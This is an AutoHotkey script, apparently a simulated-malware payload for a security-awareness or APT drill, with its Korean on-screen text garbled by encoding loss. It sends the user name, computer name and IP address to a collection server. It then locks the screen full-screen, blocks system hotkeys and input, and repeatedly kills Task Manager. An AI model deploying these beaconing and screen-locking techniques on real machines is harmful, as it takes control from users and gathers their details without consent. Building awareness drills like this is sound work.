#NoEnv
#SingleInstance Force

; ��輭�� url
;url = http://abl_shinabro.mooo.com:33033/fileclick
;url = http://192.168.219.120:30000/fileclick
url = http://127.0.0.1:8080/fileclick

; Gettering Information
userName = %A_UserName%
computerName = %A_ComputerName%
ip = %A_IPAddress1%

; Make POST Packet
data = userName=%userName%&computerName=%computerName%&ip=%ip%
winHttp := ComObjCreate("WinHttp.WinHttpRequest.5.1")
winHttp.Open("POST", url)
winHttp.SetRequestHeader("Content-Type", "application/x-www-form-urlencoded")
winHttp.Send(data)
winHttp.WaitForResponse()
response := winHttp.ResponseText 


; Set Timer (SEC)
; cnt = 600
cnt = 5

; Terminate Cheat Key
key := "a"

Loop
{
	URLDownloadToFile, http://127.0.0.1:8080/fileclick/download/JJAL.jpg, memo.jpg
	if not ErrorLevel
		break
}

widsize = %A_ScreenWidth%
imgw := (widsize // 2)-370

Gui, Font, S30 C000000 +Center Bold, ���� ���
Gui, Add, Text, x0 y100 w%A_ScreenWidth% h53 +Center, [ABL ���� APT �Ʒ� �����Ʒ� ���� ��]
Gui, Font, S20 C000000, ���� ���
Gui, Add, Text, x0 y180 w%A_ScreenWidth% h35 +Center , �� PC�� �Ʒÿ� �Ǽ��ڵ忡 �����Ǿ����ϴ�.
Gui, Add, Text, x0 y220 w%A_ScreenWidth% h35 +Center , �� ���� PC���� �������� �� ȸ�������� ����ǰ� �ֽ��ϴ�.
Gui, Add, Text, x0 y260 w%A_ScreenWidth% h35 +Center , �� ���� PC�� ���� �ٸ� ������ PC�� �Ǽ��ڵ带 �����ϰ� �ֽ��ϴ�.
Gui, Font, S20 C000000 Bold, ���� ���
Gui, Add, Text, x0 y320 w%A_ScreenWidth% h35 +Center ,  �� �Ʒÿ� �Ǽ��ڵ� �������� ���� PC����� 5�а� ���ܵ˴ϴ�.
Gui, Add, Text, x0 y360 w%A_ScreenWidth% h35 +Center vcnt, %cnt% �ʰ� ���� �Ŀ� PC ����� �����մϴ�.
Gui, Font, S15 C000000, ���� ���
Gui, Add, Picture, x%imgw% y450 +Center, memo.png
Gui, Font, S25 C000000, ���� ���
Gui, Add, Text, x0 y710 w%A_ScreenWidth% h43 +Center, ���� ���ǻ����� �������������� �����ֽñ� �ٶ��ϴ�.

SetTimer, call, 1000
SetTimer, TaskManager, 100

Gui, Color, FFFFFF
Gui, +LastFound +AlwaysOnTop -Caption +ToolWindow
Gui, Show, Maximize
FileDelete, memo.png

; Start Timer
call:
{
	GuiControl, , cnt, %cnt% �ʰ� ���� �� ��� �����մϴ�.
	if cnt = 0
	{
		SetTimer, call, Off
		GuiClose:
			ExitApp
	}
	cnt--
}

; Control keyboard
LWin:: return		; Left Win
RWin:: return		; Right Win
#D:: return			; Win + D
!Tab:: return		; Alt + Tab
#Tab:: return		; Win + Tab
!F4:: return		; Alt + F4
^+Esc:: return		; Ctrl + Shift + Esc
^+F12:: ExitApp		; ���α׷� �������� (ġƮŰ)

; TaskMgr
TaskManager:
{
	BlockInput, On
	WinClose, Windows �۾� ������
	WinClose, �۾� ������
	Process, Close, Taskmgr.exe
	Process, Close, C:\Windows\System32\Taskmgr.exe
}